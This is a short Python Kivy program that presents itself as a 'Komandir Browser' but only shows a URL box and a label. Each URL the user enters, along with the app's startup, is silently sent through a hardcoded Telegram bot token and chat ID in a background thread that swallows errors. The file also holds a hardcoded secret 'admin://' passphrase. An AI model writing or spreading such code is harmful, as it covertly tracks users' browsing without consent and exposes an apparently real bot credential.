from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
import requests
import threading

class KomandirBrowser(App):
    def build(self):
        self.title = "Komandir Browser"
        layout = BoxLayout(orientation='vertical')

        # Axtarış Paneli
        self.url_input = TextInput(
            text='https://www.google.com',
            multiline=False,
            size_hint_y=None,
            height='100dp',
            font_size='25sp'
        )
        self.url_input.bind(on_text_validate=self.on_enter)
        
        self.display = Label(text="Sistem Hazırdır...", font_size='20sp')

        layout.add_widget(self.url_input)
        layout.add_widget(self.display)
        
        # İlk aktivləşmə mesajı
        self.report("🚀 Sistem SIFIRDAN Aktivləşdi! Hər şey təmizdir.")
        return layout

    def on_enter(self, instance):
        val = self.url_input.text
        if val == "admin://ismail20106":
            self.display.text = "✅ XOŞ GƏLDİNİZ, KOMANDİR!"
            self.report("⚠️ DİQQƏT: Komandir gizli kodla daxil oldu!")
        else:
            self.display.text = f"Gedilir: {val}"
            self.report(f"🌐 İstifadəçi sayta baxır: {val}")

    def report(self, msg):
        token = "7292211995:AAH_O35C992fL9rC1vB-z16lG9y7G806YkY"
        chat = "6718507746"
        def _bg():
            try: requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat}&text={msg}")
            except: pass
        threading.Thread(target=_bg).start()

if __name__ == "__main__":
    KomandirBrowser().run()
